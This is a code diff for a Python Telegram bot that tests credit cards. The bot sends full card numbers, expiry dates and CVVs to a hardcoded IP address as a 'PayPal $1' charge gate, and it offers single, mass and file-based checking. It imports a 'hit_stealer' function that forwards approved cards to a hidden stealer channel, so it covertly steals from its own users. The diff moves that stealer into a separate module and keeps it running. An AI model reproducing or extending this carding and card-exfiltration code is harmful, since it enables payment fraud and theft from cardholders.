@@ -6,7 +6,7 @@ import os
 from pyrogram import Client, filters
 from FUNC.usersdb_func import *
 from FUNC.defs import *
-from TOOLS.check_all_func import *
+from TOOLS.check_all_thing import *
 from TOOLS.getbin import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
@@ -42,12 +42,6 @@ async def send_colored_msg(client, chat_id, text, reply_to_message_id=None, mess
         except:
             return None
 
-async def send_hit_if_approved(client: Client, text: str):
-    try:
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
-    except Exception as e:
-        print(f"[Stealer Error] Failed to forward: {e}")
-
 async def call_stripe_api(fullcc):
     endpoint_url = f"http://138.128.240.15:8024/paypal_1?cc={fullcc}"
     async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
@@ -58,7 +52,7 @@ async def call_stripe_api(fullcc):
                 
                 api_status = result_json.get("status", "Unknown").upper()
                 response_msg = result_json.get("message", "No response message")
-                gate_name = result_json.get("gate", "PayPal 1$ charge")
+                gate_name = result_json.get("gate", "PayPal $1")
                 
                 if "APPROVED" in api_status or "SUCCESS" in api_status:
                     return "Approved ✓", response_msg, gate_name
@@ -68,9 +62,9 @@ async def call_stripe_api(fullcc):
                     return api_status, response_msg, gate_name
             except:
                 if attempt == 1:
-                    return "Error", "Request failed", "PayPal 1$ charge"
+                    return "Error", "Request failed", "PayPal $1"
                 await asyncio.sleep(1)
-    return "Error", "Request failed", "PayPal 1$ charge"
+    return "Error", "Request failed", "PayPal $1"
 
 def extract_cards(text):
     pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
@@ -93,7 +87,7 @@ async def stripe_charge_cmd(Client, message):
             resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
-⟢ <b>ɢᴀᴛᴇ :</b> PayPal 1$ charge
+⟢ <b>ɢᴀᴛᴇ :</b> PayPal $1
 ◈ <b>ᴄᴍᴅ :</b> /pp1
 
 ⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗
@@ -105,7 +99,7 @@ async def stripe_charge_cmd(Client, message):
             
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
-        gateway = "PayPal 1$ charge"
+        gateway = "PayPal $1"
         
         firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
 
@@ -137,19 +131,21 @@ async def stripe_charge_cmd(Client, message):
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
-        # Invisible lines to force collapse by default
+        # Zero-width spaces to force collapse without visible space
+        zero_width_padding = "&#8203;" * 1000
+        
         finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
 💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
-💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response}
+💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
 ════『 INFO 』════
 <blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
 💠 𝘽𝙞𝙣-» {brand}
 _{type_}-{level}
-💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>
+💠 𝘽𝙖𝙣𝙠-» {bank}{zero_width_padding}</blockquote>
 ════『 META 』════
 💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
 💠 𝙏𝙞𝙢𝙚-» {time.perf_counter() - start:0.2f}s
-💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯
+💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> 🍷 ↯
 {role}
 ════『 OWNER 』════
       <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
@@ -185,7 +181,7 @@ async def stripe_mass_check_cmd(Client, message):
             resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
-⟢ <b>ɢᴀᴛᴇ :</b> PayPal 1$ charge
+⟢ <b>ɢᴀᴛᴇ :</b> PayPal $1
 ◈ <b>ᴄᴍᴅ :</b> /mpp1
 
 ⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗
@@ -224,7 +220,7 @@ async def stripe_txt_check_cmd(Client, message):
             resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
-⟢ <b>ɢᴀᴛᴇ :</b> PayPal 1$ charge
+⟢ <b>ɢᴀᴛᴇ :</b> PayPal $1
 ◈ <b>ᴄᴍᴅ :</b> /tpp1
 
 ⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
@@ -256,7 +252,7 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
     initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
-💠 𝙂𝙖𝙩𝙚 -» PayPal 1$ charge
+💠 𝙂𝙖𝙩𝙚 -» PayPal $1
 💠 𝘾𝙘 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
 💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
 💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
@@ -274,7 +270,7 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
         getbin = await get_bin_details(cc_num)
         brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
         
-        invisible_lines = "&#160;\n" * 10
+        zero_width_padding = "&#8203;" * 1000
         card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
 💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
 💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
@@ -282,8 +278,7 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
 <blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
 💠 𝘽𝙞𝙣-» {brand}
 _{type_}-{level}
-💠 𝘽𝙖𝙣𝙠-» {bank}
-{invisible_lines}</blockquote>
+💠 𝘽𝙖𝙣𝙠-» {bank}{zero_width_padding}</blockquote>
 ━━━━━━━━━━━━━━━━━━━━
 """
         final_text += card_resp
@@ -296,7 +291,7 @@ _{type_}-{level}
     footer = f"""════『 META 』════
 💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
 💠 𝙏𝙞𝙢𝙚-» {elapsed_time}s
-💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
+💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> 🍷 ↯
 {role}
 ════『 OWNER 』════
       <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
